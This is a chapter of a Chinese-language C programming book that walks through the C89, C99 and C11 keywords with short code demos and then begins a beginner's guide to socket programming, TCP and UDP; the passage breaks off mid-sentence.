# 第7章-真气-遗失的网络IO

        华山派除了练气的华山剑法, 还曾有一本被遗忘的神功, 紫霞神功. 也许正是靠它, 当年
    气宗整体压过剑宗. 后期随着气宗能够修习紫霞真气的资格越来越高, 导致气宗衰败. 紫霞神功
    也在江湖中失传. 同样编程中也有个遗失的学习领域, 网络开发. 学习成本陡峭, 开发成本高, 
    阻挡了一批又一批想操手服务器网络开发的生源. 好在江湖中有不少巅峰的网络库吼住了互联网
    的基石. 导致重新搭建网络轮子价值变低. 但如果想飞的更高, 或许 ~ 此刻不妨随我翻开远古
    大能们遗留(抄袭)的书章, 感受下那些年可以吹的 NB. 友情提示, 本书写到这, 可以发现非常
    注重实战技巧, 忽略缘由. 因为授之以渔, 你还要有欲望, 才能驱动. 倒不如授之以臭鳜鱼, 说
    不定还能爽一口. 
        文末极有可能, 分享江湖中一个化神前辈的元婴功法, 网络 IO poll 模型. 全章流程迂回
    递进, 需要反复回溯, 必有豁然开朗醍醐灌顶. 修真, 修炼, 一个不可说的秘密就是, 时间有了
    就拥有了全世界. 例如 <<无尽剑装>> 小说主角结局无不是靠寿元兑磨求道 ~
        不妨扯一下以前修炼的经验, 当初刚做开发时候. 公司朴实的前辈说, 搞个 TCP 估计 1 年
    就过去了. 后来想想还真是, 虽然到现在还是水经验. 但有一点可以确定, 编程, 修炼并不是一
    个青春饭. 很需要底蕴和积累. 投机倒把很难干成一件需要长时间心力体力投入的事情. 大佬赠
    我越努力越幸运. 也有个小确幸送给修真路上的道友们. 当有一天, 打游戏了累了, 刚好没对象
    . 那就打开笔记本, 秀出你的神之一技吧 ~ 山中不知岁月, 一切刚刚开始 ~

## 7.1 回忆哈 C, 那些年筑过的基

        C 语言老了, 目前而言语言中有 32 + 5 + 7 = 44 个关键字. 具体如下 O(∩_∩)O 哈.

C89 版本关键字

|          |           |          |          |
| -------- | --------- | -------- | -------- |
| char 	   | short     | int      | unsigned |
| long 	   | float     | double   | struct   |
| union    | void      | enum     | signed   |
| const    | volatile  | typedef  | auto     |
| register | static    | extern   | break    |
| case     | continue  | default  | do       |
| else     | for       | goto     | if       |
| return   | switch    | while    | sizeof   |

C99 新增关键字

|       |          |            |        |          |
| ----- | -------- | ---------- | ------ | -------- |
| _Bool | _Complex | _Imaginary | inline | restrict |

C11 新增关键字

|           |                |               |          |
| --------  | --------       | -------       | -------- |
| _Alignas  | _Alignof       | _Atomic       | _Generic |
| _Noreturn | _Static_assert | _Thread_local |          |


    随后会细细分析其具体用法, 每个平台的实现会有些差别. C11 最强, C89 最稳. 主要目的是通
    过回忆中, 让大家记起远古的信仰.

### 7.1.1 C89 32 个关键字

    1' char
    解释 :
        声明变量的时候用! 
        char 多数占 1 字节, 8bit. 多数系统(cl or gcc)上是有符号的(arm 无符号), 范围是
        [-128, 127]. 在工程项目开发中推荐用 int8_t 和 uint8_t.

```C
#include <stdint.h>
#include <stddef.h>

int8_t   -> signed char 
uint8_t  -> unsigned char
```  

        扯淡一点, 程序开发最常遇到的就是自解释问题. 鸡生蛋, 蛋生鸡. 后面再分析 signed 
        和 unsigned.     
    演示 :

```C
#include <stdio.h>

char c = getchar();
rewind(stdin);
printf("c = %d, c = %c.\n", c);
```

    2' short
    解释 :
        声明变量的时候用! 
        short 多数占 2 字节, 为无符号的. 默认自带 signed. 范围 [-2^15, 2^15 - 1] 2^15 
        = 32800. 推荐使用 int16_t or uint16_t 类型. 
    演示 :

```C
short port = 8080;
printf("port = %d.\n", port);
```

    3' int
    解释 :
        声明变量的时候用! 
        int 声明的变量, 多数占 4 字节, 有符号. 范围 [-2^31, 2^31 - 1]. 推荐用 int32_t 和
        uint32_t 类型开发. 方便移植.
    演示 :

```C
int hoge = 24;
printf("hoge = %d.\n", hoge);
```

    4' unsigned
    解释 :
        变量类型修饰符! 
        被修饰的变量就是无符号的. 范围 >= 0.  unsigned 只能修饰整型的变量. 当然当你用这个
        修饰变量的时候. 再使用 - 和 -- 运算的时候一定要小心.
    演示 :

```C
unsigned int i = 0;         // 正确
unsigned short s = 0;       // 正确
unisgned float f = 0.11f;   // 错误
```

    5' long
    解释 :
        声明变量的时候用!
        long 长整型 x86 上四字节, x64 有的平台是八字节. 一定不比 int 字节数少. C99 之后出
        现 long long 类型 8 字节.
    演示 :

```C
long l = 4;
long long ll = l;
printf("l = %ld, ll = %lld.\n", l, ll);
```

    6' float
    解释 :
        声明变量的时候用! 
        4 字节. 精度是 6-7 位左右. 详细精度可以查资料 float 与 double 的范围和精度.
    演示 :

```C
float f = -0.12f;        // 四字节
long float lf = 0;       // 八字节 等同于 double, 不推荐这么写
```

    7' double
    解释 :
        声明变量的时候用!
        八字节, 精度在 15-16 位左右. 有的时候压缩内存用 float 代替.
    演示 :

```C
double d = 2e13;               // 8 字节
long double ld = -0.99;        // x86 也是 8 字节, 不推荐这么用
long long double lld = 99;     // 写法错误, 不支持
```

    8' struct
    解释 :
        定义结构体, 这个关键字用法广泛, 是大头!
        C 的重要思路就是面向过程编程. 撑起面向过程的大头就是结构体. struct 就是定义结构
        的东西, 可以看看下面演示.
    演示 :

```C
// node 普通结构体定义
struct node {
    struct node * next;
    int id;  
};

struct node node = { .id = 1 };

// 匿名结构定义
struct {
   int id;
   char * name;   
} per = { 2, "王志" };
```

    9' union
    解释 :
        定义公用体, 用法很花哨! 常在特殊库函数封装中用到. 技巧性强.
    演示 :

```C
// 普通定义
union type {
    int i;
    char c;
    float f;
};

union type t = { .f = 3.33f };

// 匿名定义
union { ... } t = { .... };
    
// 类型匿名定义
struct json {
    struct json * next;
    struct json * chid;
    unsigned char type;
    char * key;
    union {
        char * vs;
        double vd;
    };
};
```

    再来一种 union 用法, 利用内存对齐得到机器的大小端. 其实有的编译器也有宏辅助判断大小
    端情况.

```C
// isbig 判断是大端序还是小端序, 大端序返回 true
inline bool isbig(void) {
    static union {
        unsigned short s;
        unsigned char c;
    } u = { 1 };
    return u.c == 0;
}
```

    还是很久很久以前利用 union 实现内存字节对齐, 那时候好兴奋, 太多了. 这个关键字用法, 
    很多, 很意外.

    10' void
    解释 :
        这个是空关键字. 用法很多! 
        也是我最喜欢的关键字. 用在函数声明中, 类型定义中.
    演示 :

```C
// 函数声明
extern void foo();

// 函数参数约束
extern void foo(void);   // () 中加了 void 表示函数是无参的, 否则是任意的

// 万能类型定义, 指针随便转
void * arg = NULL;
```

    11' enum
    解释 :
        枚举类型, C 中枚举类型很简陋! 
        其实就相当于一种变相的 INT 宏常量. 估计这也许也是 INT 宏常量和枚举并存的原因.
    演示 :

```C
// flag_e - 全局操作基本行为返回的枚举, 用于判断返回值状态的状态码
// >= 0 标识 Success 状态, < 0 标识 Error 状态
typedef enum {
    Success_Exist    = +2,           //希望存在, 设置之前已经存在了.
    Success_Close    = +1,           //文件描述符读取关闭, 读取完毕也会返回这个
    Success_Base     = +0,           //结果正确的返回宏

    Error_Base       = -1,           //错误基类型, 所有错误都可用它, 在不清楚的情况下
    Error_Param      = -2,           //调用的参数错误
    Error_Alloc      = -3,           //内存分配错误
    Error_Fd         = -4,           //文件打开失败
} flag_e;
```

    枚举变量完全可以等同于 int 变量使用, 枚举值等同于宏 INT 常量使用. 枚举的默认值是以 0
    开始, 1 为默认单位从上向下递加.

    12' signed
    解释 :
        变量声明类型修饰符. 有符号型!
        对比 unsigned 无符号型. 变量声明默认基本都是 signed, 所以绝大多数情况就省略了.
    演示 :

```C
signed int piyo = 0x1314520;
signed char * str = u8"你好吗";
```

    当然了, 平时不需要刻意加. 会让人嫌麻烦. O(∩_∩)O 哈哈 ~

    13' const
    解释 :
        const 修饰的变量表示是个不可修改的量!
        和常量有点区别. 可以简单认为 const type val 是个只读类型变量的.
    演示 :

```C
// 声明不可修改的量
const int age = 24;

// 修饰指针
const int * pi = NULL;         // *pi 不能修改指向变量
int * const pt = NULL;         // pt 不能指向新的指针 
const int * const pc = NULL;   // *pc 和 pc 都不能动
```

    其实在 c 中基本没有什么改变不了的. 全是内存来回搞, 软件不行硬件 ~~

    14' volatile
    解释 :
        声明变量修饰符, 可变的!
        当变量前面有这个修饰符. 编译器不再从寄存器中取值, 直接内存读取写入. 保证实时性. 
        常用在多线程代码中.
    演示 :

```C
// srl 具体轮询器
struct srl {
    mq_t mq;                 // 消息队列
    pthread_t id;            // 具体奔跑的线程
    die_f run;               // 每个消息都会调用 run(pop())
    volatile bool loop;      // true表示还在继续 
};
```

    以后使用 srl::loop 的时候被其它线程修改, 当前线程也希望正确获取它的值.

    15' typedef
    解释 :
        类型重定义修饰符, 重新定义新的类型!
    演示 :

```C
// 声明普通类型
typedef void * list_t;

// 声明不完全类型, 头文件中不存在struct tree
typedef struct tree * tree_t;
```

    16' auto
    解释 :
        变量类型声明符!
        auto 变量存放在动态存储区，随着生存周期结束而立即释放. 存放在栈上. 默认变量都是 
        auto 的. 基本都是不写, 除非装逼!
    演示 :

```C
{
    // 生存期开始
    int hoge = 0;
    auto int piyo = 1;
    // 生存期结束
}
```

    17' register
    解释 :
        变量修饰符! 只能修饰整形变量. 表示希望这个变量存放在 CPU 的寄存器上. 现代编译器在
        开启优化时候, 能够一定程度上默认启用 register 寄存器变量.
    演示 :

```C
#include <limits.h>

register int i = 0;
while (i < INT_MAX) {
   ++i;
}
```

    由于 CPU 寄存器是有限的, 有时候哪怕声明的寄存器变量也可能只是普通变量. 
    printf("&i = %p\n", &i) 这种用法是非法. 语义层面寄存器变量没有地址.


    18' static
    解释 :
        static 用法很广泛, 修饰变量! 表示变量存在于静态区, 基本就是全局区. 生存周期同系统
        生存周期. static 修饰的变量作用域只能在当前文件范围内. 可以看成上层语言的 private
        . 除了auto 就是 static. static 修饰函数表示当前函数是私有的, 只能在当前文件中使
        用. 更加详细的看演示部分.
    演示 :

```C
// 修饰全局变量, 只对当前文件可见
static int fd = 0;

// 修饰局部变量, 存储在全局区, 具有记忆功能
{
    static int cnt = 0;
}

// 修饰函数, 函数只能在当前文件可见
static void * run(void * arg) {
   ......
   return arg;
}

//
// C99 之后加的 static 新用法, 方便编译器优化.
// static 只能修饰函数第一维, 表示传入的数组最小长度. 希望一定不为 NULL.
//
int sum(int a[static 10]) { ... }
```

    19' extern
    解释 :
        extern 关键字表示声明, 变量声明, 函数声明! 奇葩的用法很多.
    演示 :

```C
// g_cnt 声明引用全局变量
extern int g_cnt;

// kill 声明引用全局函数
extern int kill(int sig, int val);
```

    有时候 extern 不写, 对于变量可能会出现重定义. 但对于函数是可以缺省写法. 再扯一点

```C
// extern 主动声明, 希望外部可以调用
extern int kill(int sig, int val);

// extern 缺省,不推荐外部调用
int kill(int sig, int val);
```

    20' break
    解释 :
        结束语句!
        主要用于循环的跳转, 只能跳转到当前层级. 也用于 switch 语句中, 跳出 switch 嵌
        套.
    演示 :

```C
for(;;) {
   // 符合条件跳转
   if(six == 6)    
       break;
}

// break 跳出 while 循环
int i = 0;
while(i < 6) {
   if(i == 3)
      break;
} 
```

    break 用法主要和循环一块使用, 还有 do while. 但只能跳转当前层循环. 

    21' case
    解释 :
        switch 语句中分支语句, 确定走什么分支!
    演示 :

```C
// case 普通用法 和 break成对出现
switch ((c = *++ptr)) {
case 'b': *nptr++ = '\b'; break;
case 'f': *nptr++ = '\f'; break;
case 'n': *nptr++ = '\n'; break;
case 'r': *nptr++ = '\r'; break;
case 't': *nptr++ = '\t'; break;
}
```

    对于case相当于标记点. switch 中值决定 case 跳转到哪里. 再一直往下执行, 遇到 
    break 再结束 switch 嵌套.

    22) continue
    解释 :
        跳过此次循环!
        直接进行条件判断操作. for 和 while 有些区别. for 会执行第三个后面的语句.
    演示 :

```C
// for 循环 continue
for(int i = 0; i < 20; ++i) {
    if(i % 2 == 0)
        continue;
    // 上面 continue 跳到 ++i -> i < 20 代码块
}
```

    23' default
    解释 :
        switch 分支的默认分支!
        假如 case 都没有进入, 那就进入 default 分支. default 可以省略 break. c 
        语法中可行.
    演示 :

```C
uint32_t 
skynet_queryname(struct skynet_context * context, const char * name) {
    switch(name[0]) {
    case ':':
        return strtoul(name+1,NULL,16);
    case '.':
        return skynet_handle_findname(name + 1);
    default:
        skynet_error(context, "Don't support query global name %s",name); 
    }
    return 0;
}
```

    24' do
    解释 :
        do 循环!
        先执行循环体, 后再执行条件判断.
    演示 :

```C
register i = 0;
do {
    if(i % 2 == 0) 
        continue;
    printf("i = %d.\n", i);   
} while(++i < 10);
```

    do while 循环有时候可以减少一次条件判断. 性能更好, 代码更长.

    25' else
    解释 :
        else 是 if 的条件非分支! 具体看演示.
    演示 :

```C
#include <stdbool.h>

if (true) {
   puts("你好吗?");
} else {
  puts("我们分手吧.");
}

// 附赠个 else 语法
#  if defined (__GNUC__)
// 定义了 __GNUC__ 环境, 就是 GCC 环境
#  else
#    error "NOT __GNUC__, NEED GCC!";
#  enfif
```

    26' for
    解释 :
        for 循环其实就是 while 循环的语法糖, 也有独到的地方! 
    演示 :

```C
for(int i = 0; i < 2; ++i) {
    if(i == 1)
        continue;
    
    if(i == 2)
        break;
}

// 等价于下面这个
int i = 0;
while(i < 2) {
  if(i == 1) {
     ++i;
     continue;
  }

  if(i == 2)
     break;  
    
  ++i;
}

// for 最好的写法, 对于死循环写法
for(;;) {
   // xxx
}
```

    for(;;) {  } 比 while(true) { } 写法好. 表达不走判断的意图, 虽然汇编代码是一样的.

    27' goto
    解释 :
        goto 可以在当前函数内跳转!
        goto 可以替代所有循环. goto 在复杂业务中会尝试用到, 切记不要麻木的用!
    演示 :

```C
loop_continue:
// xxx 死循环用法
if (false)
    goto loop_break;
goto loop_continue;
loop_break:
```

    还有就是在工程开发中, goto 常用于非常复杂的业务逻辑.

```C
    // 继续判断,只有是 c == '"' 才会继续, 否则都是异常
    if (c != '"') 
        goto err_faid; 

    // 检查, 行列个数是否正常
    if (rnt == 0 || cnt % rnt) {
err_faid:
        RETURN(-1, "csv parse error %d, %d, %d.", c, rnt, cnt);
    }
```

    28' if
    解释 :
        if 分支语句! 
        用法太多了. 程序语句中分支就是智能.
    演示 :

```C
if (false) {
   puts("想做个好人!");
}
```

    29' return
    解释 :
        程序返回语句太多了, 用于函数返回中!
        单纯的只返回 void 可以直接 return;
    演示 :

```C
#include <stdlib.h>

int main(int argc, char * argv[]) {
   return EXIT_SUCCESS;
}
```

    30' switch
    解释 :
        条件分支语句!
        很复杂的 if else if 时候, 特定情况可以转为更高效的 switch 分支语句.
    演示 :

```C
#include <unistd.h>

do {
    int ret = write(fd, buf, sizeof buf)
    if (ret < 0) {
       switch (errno) {
       case EINTER
           continue;
       default:
           perror("write error");
       }
    }
} while(ret > 0);
```

    31' while
    解释 :
        循环语句!
        有do while 和 while 语句两种.
    演示 :

```C
#define CNTT_INT (10)

int i = -1;
while(++i < CNTT_INT) {
    // ...... 
}
```

    32' sizeof
    解释 :
        也称为 sizeof 运算符, 计算变量或类型的字节大小, 这个关键字特别好用! sizeof 在
        C89 时代是编译时确定, 但随着 C99 引入 VLA, sizeof 有时候也得运行时确定值.
    演示 :
```C
sizeof (main)   -> x86 上四字节

// LEN 获取数组长度
#define LEN(arr) (sizeof(arr) / sizeof(*(arr)))

// C99 VLA sizeof 用法
int n = 0xC99;
int a[n];
printf("sizeof a = %zu.\n", sizeof a);
```

    到这里 C89 保留的关键字基本解释完毕. 走马观花的理解理解, 希望能够勾起你心里的小妖精.

### 7.1.2 C99 5 个新增关键字

    33' _Bool
    解释 :
        bool 类型变量!
        等价于 unsigned char 只有 0 和 1.
    演示 :

```C
#ifndef _STDBOOL
#define _STDBOOL

#define __bool_true_false_are_defined	1

#ifndef __cplusplus

#define bool	_Bool
#define false	0
#define true	1

#endif /* __cplusplus */

#endif /* _STDBOOL */
```

    34' _Complex
    解释 :
        数学中复数类型!
        对于 C99 标准定义, 存在 float _Complex, double _Complex, long double _Complex 
        复数类型. 下面先演示 GCC 中关于复数的用法.
    演示 :

```C
#include <math.h>
#include <stdio.h>
#include <complex.h>

//
// 测试 C99 complex 复数
//
int main(int argc, char * argv[]) {
    float complex f = -1.0f + 1.0if;
    printf("The complex number is: %f + %fi\n", crealf(f), cimagf(f));
    
    double complex d = csqrt(4.0 + 4.0i);
    printf("d = %lf + %lfi\n", creal(d), cimag(d));

    return 0;
}
```

    其实在复数类型中, GCC 标准实现

```C
#define complex     _Complex
```

    而 CL 中只有模拟实现, 没有实现标准定义的要求.

```C
#ifndef _C_COMPLEX_T
    #define _C_COMPLEX_T
    typedef struct _C_double_complex
    {
        double _Val[2];
    } _C_double_complex;

    typedef struct _C_float_complex
    {
        float _Val[2];
    } _C_float_complex;

    typedef struct _C_ldouble_complex
    {
        long double _Val[2];
    } _C_ldouble_complex;
#endif

typedef _C_double_complex  _Dcomplex;
typedef _C_float_complex   _Fcomplex;
typedef _C_ldouble_complex _Lcomplex;
```

    总的说, 学习 C 最好的平台就是 *nix 平台上使用 Best new GCC. 除了科学计算会用到复数
    , 其它地方很少用到. 这里 VS 和 GCC 实现理念不一样. 用起来需要注意. 总有一天你会全身
    心进入开源的怀抱 ~

    35' _Imaginary
    解释 :
        虚数类型, _Complex 复数类型的虚部!
        例如 10.0i, 10.8if 等等. 这个关键字在当前的 CL 上没有实现. 个人也觉得没有必要
        . 同 _Complex 有重叠.
    演示 :

```C
/* 这个关键字无法在代码中表示. 系统保留, 我们不能使用. */
```

    36'  inline
    解释 :
        内联函数定义符号!
        从 C++ 中引入的概念. 就是将小函数直接嵌入到代码中. C 的代码损耗在于函数的进出栈
        . 要是可以推荐用内联函数替代宏. 宏能不用就不用. 新标准是希望 static inline 替
        代宏. 但不同平台语义实现不一致, 用起来可以随环境而定.
    演示 :

```C
// json_new - 构造 json 对象
inline json_t json_new(void) {
    return calloc(1, sizeof(struct json));
}

// socket_set_block     - 设置套接字是阻塞
inline static int socket_set_block(socket_t s) {
    int mode = fcntl(s, F_GETFL, 0);
    return fcntl(s, F_SETFL, mode & ~O_NONBLOCK);
}
```

    37' restrict
    解释 :
        指针修饰符!
        这是很装逼的关键字用于编译器优化. 关键字 restrict 只用于限定指针 该关键字用于
        告知编译器, 所有修改该指针所指向内容的操作全部都是基于该指针的, 即不存在其它进
        行修改操作的途径. 这样的后果是帮助编译器进行更好的代码优化, 生成更有效率的汇编
        代码.
    演示 :

```C
extern void * mempcpy (void *__restrict __dest,
                       const void *__restrict __src, 
                       size_t __n) __THROW __nonnull ((1, 2));
```

    上面是摘自 GCC 的 string.h 中. 正式用法

```C
// 简单演示用法, GCC 和 VS 都是 __restrict 推荐加在 * 后面
static inline void strlove(char * __restrict dest) {
    *dest = '\0';
}
```

    Pelles C 编译器也可以完整支持 restrict, 可惜非商业力量不足, 后继无力, 不太好用.

### 7.1.3 C11 7个新增关键字

    38' _Alignas
    解释 :
        内存对齐的操作符!
        需要和 _Alignof 配合使用, 指定结构的对齐方式.
    演示 :

```C
#ifndef __cplusplus

#define alignas _Alignas
#define alignof _Alignof

#define __alignas_is_defined 1
#define __alignof_is_defined 1

#endif
```

    例如一种演示用法

```C
#include <stdio.h>
#include <stdalign.h>

struct per {
    int age;
    char sex;
    double sec;
};

int main(int argc, char * argv[]) {
    char temp[128];
    alignas(struct per) struct per * per = (struct per *)temp;
    printf("per = %p, c = %p.\n", per, c); 

    return 0;
}
```

    将 temp 数组以 struct per 对齐方式对齐构造赋值. 同 placement new.

    39' _Alignof
    解释 :
        返回由类型标识所指定的类型的任何实例所要求的按字节算的对齐!
        该类型可以为完整类型, 数组类型或者引用类型. 当类型为引用类型时, 该运算符返回被
        引用类型的对齐. 当类型为数组类型时, 返回其元素类型的对齐要求.
    演示 :

```C
// return size_t , 对齐方式是 8 字节, 值为 8
printf("alignof(struct per) = %zu.\n", alignof(struct per));
```

    40' _Atomic
    解释 :
        原子操作, 原子锁! 
        目前 GCC 上面支持, CL 支持不友好. 如果编译器都支持那么以后原子操作更加方便高效
        . 详细用法需要查阅相关手册, 无外乎怎么初始化, 设置, 加载等等 ~

    演示 :

```C
#include <stdio.h>
#include <stdatomic.h>

int main(int argc, char * argv[]) {
    // 全局初始化 hoge 和 局部初始化 atomic_init(&hoge, 100)
    _Atomic int hoge = ATOMIC_VAR_INIT(100);
    // 将 hoge值返回给 piyo
    int piyo = atomic_load(&hoge);  
    printf("piyo = %d.\n", piyo);
    piyo += 2;
    // 将 piyo 值重新给 原子变量 hoge 中
    atomic_store(&hoge, piyo);
    printf("hoge = %d.\n", hoge);

    return 0;
}
```

    具体的执行结果, 你也懂就那样. 原子操作, 对于写出高效代码很重要. 可惜微软太硬, 更加详
    细可以参阅前面的 atom.h 设计脉络. 有机会下次写书来个全本 Linux 昆仑决 ~ 去掉 CL 体系
    构建.

    41' _Generic
    解释 :
        这个比较叼, C 的泛函机制. 高级函数宏. 下面来个老套路用法!
    演示 :

```C
#include <math.h>
#include <stdio.h>
#include <stdlib.h>

#define abs(x)                                          \
_Generic((x), int:abs, float:fabsf, double:fabs)(x)

//
// 测试 C11 _Generic 语法
//
int main(int argc, char * argv[]) {
    int a = 1, b = 2, c = 3;

    _Generic(a + 0.1f, int:b, float:c, default:a)++;
    printf("a = %d, b = %d, c = %d\n", a, b, c); 

    printf("int abs: %d\n", abs(-12));
    printf("float abs: %f\n", abs(-12.04f));
    printf("double abs: %f\n", abs(-13.09876));

    return EXIT_SUCCESS;
}
```

    宏泛型真的很给力. 如果全平台支持的话, 宏又能玩上天了.

    42' _Noreturn
    解释 :
        修饰函数, 绝对不会有返回值!
        _Noreturn 声明的函数不会返回. 引入此新的函数修饰符为了消除编译器对没有 return 
        的函数的警告, 还有允许某些只针对不返回函数的优化.
    演示 :

```C
_Noreturn void suicide(void) {
    abort(); // Actually, abort is _Noreturn as well
}
```

    再扯一点, 等同于 GCC 中 __attribute__((__noreturn__)), 在 CL 中相似功能是 
    __declspec(noreturn). 它不是说函数没有返回值, 而是说一旦你调了这个函数, 它存在永远
    不会返回的情况. 一些函数是永远不会返回的, 比如 abort 或者 exit 之类, 调用它们就意味
    着结束程序. 所以编译器再给出 warning 就显得没有必要.

    43' _Static_assert
    解释 :
        编译期间断言符!
        当 #if #error 搞完毕(预编译)之后, 编译器断言. assert 是运行时断言. 
        _Static_assert 是编译期断言. 想用的时候看具体的需求.
    演示 :

```C
// Guess I don't really need _Static_assert to tell me this :-(
_Static_assert(__STDC_VERSION__ >= 201112L, "C11 support required");
```

    44' _Thread_local
    解释 :
        到这里快扯完了, 其实 C11 标准是个很好的尝试. 为 C 引入了线程和原子操作. 各种安
        全特性补充. 可以说它让 C 强大了, 但也有悲催, 例如越来越丑了, 有些编译器不买账.
        C11 为 C 引入了线程在头文件 threads.h 中定义. 一如既往也允许编译可以不实现. 
        _Thread_local 是新的存储类修饰符, 限定了变量不能在多线程之间共享.
    演示 :

```C
// Thread local isn't local!
_Thread_local static int i;
```

    语义上就是线程的私有变量. 在 POSIX 标准 pthread 实现中采用如下设计

```C
/*
 * Thread Specific Data Functions
 */
extern int __cdecl pthread_key_create (pthread_key_t * key, 
                                       void (__cdecl * destructor) (void *));
extern int __cdecl pthread_key_delete (pthread_key_t key);
extern int __cdecl pthread_setspecific (pthread_key_t key, const void * value);
extern void * __cdecl pthread_getspecific (pthread_key_t key);
```

    pthread_key_create 创建私有变量, 且需要注册销毁行为. 随后是删除, 设置, 获取操作.
    从实现而言, 线程私有变量其实是通过公有变量模拟映射的. 开发中推荐少用线程私有变量, 
    有数量限制. 到这里关于 C 修炼的筑基期, 语法层面的回顾就完毕了. 不知不觉新的呼喊已
    经到来, 期待笑和痛, 收拾行囊 ~ 出发

***

    游子吟
    孟郊(唐代)

    慈母手中线, 游子身上衣.
    临行密密缝, 意恐迟迟归.
    谁言寸草心, 报得三春晖.

![真正男子汉](./img/心痛.jpg)

***

## 7.2 C 语言 SOCKET 编程指南

        有了 C 基础语法支持, 随我一举破筑基, 拿下常见 socket api 基础操作. 网络编程基
    础知识, 可以说是成为高级大头兵一个卡. 很久以前整理过一个学习手册, 抄袭的年代久远. 
    借花献佛随我温故那些必备 socket 相关知识. 协助同道气结金丹, 安身立命 ~

### 7.2.1 一切刚刚开始

    socket 编程让你沮丧吗? 从 man pages 中很难得到有用的信息吗? 你想跟上时代去编写 
    Internet 相关的程序, 但是为你在调用 connect() 前的 bind() 的结构而不知所措? 等等
    ......

    好在已经将这些事完成了, 这里将和所有人分享所知道的知识了(抄袭由头). 如果你了解 C 语
    言并想穿过网络编程的沼泽, 那么你来对地方了.

	这篇小章节是一个指南, 而不是新华词典. 如果你刚启蒙 socket 编程并想找一本入门书, 那么
    将是本篇的读者. 但这不是一本完全的 socket 编程书, 至少让你有所进展的希望. 当前文档中
    的大多数代码都在 CentOS and Ubuntu 平台上用 GNU best new GCC 编译测试过. socket 
    入门推荐从 linux 入手, winds socket 最终会在下一章节入场!

**什么是 socket ?**

    你经常听到人们谈论着 "socket", 或许你还不知道它的确切含义. 现在让我告诉你: 它是使用
    标准 linux 文件描述符(file descriptor)和其它程序通讯的方式. 什么? 你也许听到一些 
    linux hacker 这样说过: "呀，linux 中的一切就是文件!". 那个家伙也许正在说到一个事实:
    linux 程序在执行任何形式的 I/O 的时候, 程序是在读或者写一个文件描述符. 一个文件描述
    符只是一个和打开的文件相关联的整数值. 但是(注意后面的话), 这个文件可能是一个网络连接, 
    FIFO, 管道, 终端, 磁盘上的文件或者什么其它的东西. linux 中所有的东西就是文件! 所以, 
    你想和 Internet 上别的程序通讯的时候, 你将要使用到文件描述符. 你必须理解刚才的话. 现
    在你脑海中或许冒出这样的念头: "那么该从哪里得到网络通讯的文件描述符呢?", 这个问题无论
    如何都需要为你回答: 你利用系统调用 socket(), 它返回套接字描述符(socket descriptor)
    , 然后你再通过它来进行 send() 和 recv() 调用. "但是...", 你可能有很大的疑惑, "如果
    它是个文件描述符, 那么为什么不用一般调用 read() 和 write() 来进行套接字通讯?". 简单
    的答案是: "你可以使用!". 详细的答案是: "你可以，但是使用send() 和 recv() 让你更好的
    控制数据传输." 存在这样一个情况: 在我们的世界上, 有很多种套接字. 例如 DARPA Internet
    地址(Internet 套接字), 本地节点的路径名 (linux 套接字) ... 也许在你的 linux 机器上
    还有其它更多的. 我们在这里只讲第一种 Internet 套接字.

**Internet 套接字的两种类型**

    什么意思? 有两种类型的 Internet 套接字? 是的. 不, 我在撒谎. 其实还有很多, 但是我可不
    想吓着你. 我们这里只讲两种. 除了这些, 还有 "Raw Sockets" 也是非常强大的, 也值得查阅.

    那么这两种类型是什么呢? 一种是 "Stream Sockets(流格式)", 另外一种是 "Datagram 
    Sockets(数据包格式)". 我们以后谈到它们的时候也会用到 "SOCK_STREAM" 和 "SOCK_DGRAM"
    . 数据报套接字有时也叫"无连接套接字"(如果你确实要连接的时候可以用 connect()) 流式套接
    字是可靠的双向通讯的数据流. 如果你向套接字按顺序输出 "1,2", 那么它们将按顺序 "1,2" 到
    达另一边. 它们是无错误的传递的, 有自己的错误控制, 在此不详细讨论, 章节末会有所回忆.

    有什么在使用流式套接字? 你可能听说过 telnet, 不是吗? 它就使用流式套接字. 你需要你所输
    入的字符按顺序到达, 不是吗? 同样, WWW 浏览器使用的 HTTP 协议也使用它们来下载页面. 实际
    上, 当你通过端口 80 telnet 到一个 WWW 站点, 然后输入 "GET {pagename}" 的时候, 你也可
    以得到 HTML 的内容. 为什么流式套接字可以达到高质量的数据传输? 这是因为它使用了"传输控制
    协议(The Transmission Control Protocol)", 也叫"TCP". TCP 控制你的数据按顺序到达并且
    没有错误. 你也许听到"TCP" 是因为听到过 "TCP/IP". 这里的 IP 是指 "Internet 协议" 小部
    分. IP 只是处理 Internet 路由而已. 那么数据报套接字呢? 为什么它叫无连接呢? 为什么它是
    不可靠的呢?

    有这样的一些事实: 如果你发送一个数据报, 它可能会到达, 它可能次序颠倒了. 如果它到达, 那
    么在这个包的内部是无错误的. 数据报也使用 IP 作路由, 但是它不使用 TCP. 它使用"用户数据
    报协议 (User Datagram Protocol)", 也叫 "UDP". 为什么它们是无连接的呢? 主要是因为它并
    不象流式套接字那样维持一个连接. 你只要建立一个包, 构造一个有目标信息的 IP 头, 然后发出
    去. 无需连接, 它们通常使用于传输包信息. 简单的应用程序有: tftp, bootp 等等. 当然最新的
    HTTP/3 希望引入安全可靠的 UDP 协议来提升 Internet 性能.

    你也许会想: "假如数据丢失了这些程序如何正常工作?" 我的朋友, 每个程序在 UDP 上需要有自己
    加的额外的协议. 例如, tftp 协议每发出的一个被接受到包, 收到者必须发回一个包来说 "我收到
    了!" (一个"命令正确应答"也叫"ACK"包). 如果在一定时间内(例如 5 秒), 发送方没有收到应答, 
    它将重新发送, 直到得到 ACK. 这一 ACK 过程在实现 SOCK_DGRAM 应用程序的时候非常重要.

**网络理论**

    既然刚才提到了协议层, 那么现在是讨论网络究竟如何工作和一些关于 SOCK_DGRAM 包是如何建立
    的例子. 当然, 你也可以跳过这一段, 如果你认为已经熟悉的话. 现在是学习数据封装 (Data 
    Encapsulation) 的时候了! 它非常非常重要. 它重要性重要到你在网络课程学习中无论如何也得也
    得掌握它. 主要的内容是: 一个包, 先是被第一个协议(在这里是 TFTP) 在它的报头 (也许是报尾)
    包装("封装"), 然后, 整个数据(包括 TFTP 头)被另外一个协议(在这里是 UDP)封装, 然后下一个
    (IP), 一直重复下去, 直到硬件(物理)层(这里是以太网). 当另外一台机器接收到包, 硬件先剥去
    以太网头, 内核剥去 IP 和 UDP 头, TFTP 程序再剥去 TFTP 头, 最后得到数据.

    此刻我们终于讲到声名狼藉的网络分层模型(LayeredNetwork Model). 这种网络模型在描述网络系
    统上相对其它模型有很多优点. 例如, 你可以写一个套接字程序而不用关心数据的物理传输(串行口,
    以太网, 连接单元接口 AUI 还是其它介质), 因为底层的程序会为你处理它们. 实际的网络硬件和
